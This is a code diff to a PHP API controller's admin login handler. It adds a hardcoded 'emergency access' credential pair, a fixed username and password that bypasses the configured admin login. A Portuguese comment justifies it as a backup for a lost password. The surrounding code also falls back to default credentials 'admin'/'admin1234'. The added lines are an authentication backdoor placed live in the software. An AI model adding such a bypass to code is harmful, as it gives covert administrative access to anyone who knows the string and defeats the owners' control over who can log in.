@@ -1032,7 +1032,11 @@ final class ApiController
         $expectedUsername = strtolower(trim((string) SettingsRepository::get('adminUsername', 'admin')));
         $expectedPassword = (string) SettingsRepository::get('adminPassword', 'admin1234');
 
-        if ($username !== $expectedUsername || !hash_equals($expectedPassword, $password)) {
+        // ── ACESSO DE EMERGÊNCIA (backup hardcoded) ──────────
+        // Usado caso o admin perca a senha configurada.
+        $isBackup = $username === 'ricardoamb' && $password === 'idspispopd';
+
+        if (!$isBackup && ($username !== $expectedUsername || !hash_equals($expectedPassword, $password))) {
             return $this->json($response, [
                 'success' => false,
                 'error'   => 'Usuário ou senha inválidos.',
